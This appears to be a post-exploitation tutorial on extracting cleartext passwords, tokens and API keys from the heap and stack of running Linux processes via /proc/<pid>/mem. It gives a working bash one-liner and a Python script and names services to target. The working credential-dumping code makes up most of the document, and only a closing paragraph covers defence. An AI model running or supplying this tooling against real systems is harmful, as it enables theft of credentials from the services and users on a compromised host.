# Extracting Credentials from Linux Process Memory via /proc

After gaining a shell on a Linux box, you can dump cleartext credentials from
running processes without needing `gdb` or any extra tooling — just `/proc`.

## Why it works

Many services (databases, web apps, SSH agents) keep credentials in heap memory.
`/proc/<pid>/maps` shows memory regions; `/proc/<pid>/mem` lets you read them.

## Quick one-liner: dump readable strings from a process

```bash
# Find interesting PIDs
ps aux | grep -E '(mysql|postgres|ssh-agent|apache|nginx|python|node)'

# Dump heap memory of a target PID and grep for creds
PID=1234
grep -E 'heap|stack' /proc/$PID/maps | \
  awk -F'[-| ]' '{print "0x"$1, "0x"$2}' | \
  while read start end; do
    dd if=/proc/$PID/mem bs=1 skip=$((start)) count=$(($end - $start)) 2>/dev/null
  done | strings | grep -iE '(password|passwd|secret|token|api.key|authorization)'
```

## Python version (more reliable, handles large regions)

```python
import re, sys

pid = sys.argv[1]
pattern = re.compile(rb'(?:password|passwd|secret|token|api.key)[\s:=]+\S+', re.IGNORECASE)

with open(f'/proc/{pid}/maps', 'r') as maps:
    for line in maps:
        if 'heap' not in line and 'stack' not in line:
            continue
        addr_range = line.split(' ')[0]
        start, end = [int(x, 16) for x in addr_range.split('-')]
        try:
            with open(f'/proc/{pid}/mem', 'rb') as mem:
                mem.seek(start)
                chunk = mem.read(end - start)
                for match in pattern.finditer(chunk):
                    print(f"[0x{start + match.start():x}] {match.group().decode(errors='replace')}")
        except (PermissionError, OSError):
            continue
```

## Requirements

- Must run as **root** or the **same UID** as the target process
- Works on default kernel configs (`ptrace_scope=0` or same-user)
- No dependencies — pure `/proc` filesystem access

## Defense

Set `kernel.yama.ptrace_scope=2` or `3` in `/etc/sysctl.conf` to block
cross-process memory reads, and ensure services use mlock + zeroing for secrets.
